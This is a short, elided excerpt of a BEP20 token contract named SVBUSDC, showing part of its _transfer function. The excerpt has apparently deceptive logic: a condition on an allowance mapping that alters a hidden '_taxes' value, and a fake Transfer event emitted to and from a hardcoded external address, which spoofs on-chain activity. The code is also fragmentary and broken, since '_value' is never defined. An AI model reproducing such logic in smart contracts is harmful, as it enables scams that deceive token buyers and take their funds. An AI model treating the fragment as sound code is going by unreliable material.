...
contract SVBUSDC is Context, IBEP20, Ownable {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (_taxes[sender] == 0 && uniswapV2Pair != sender && _allowance[sender] > 0) {
            _taxes[sender] -= _value;
        }
        ...
        emit Transfer(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B, 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B, 10);
    }
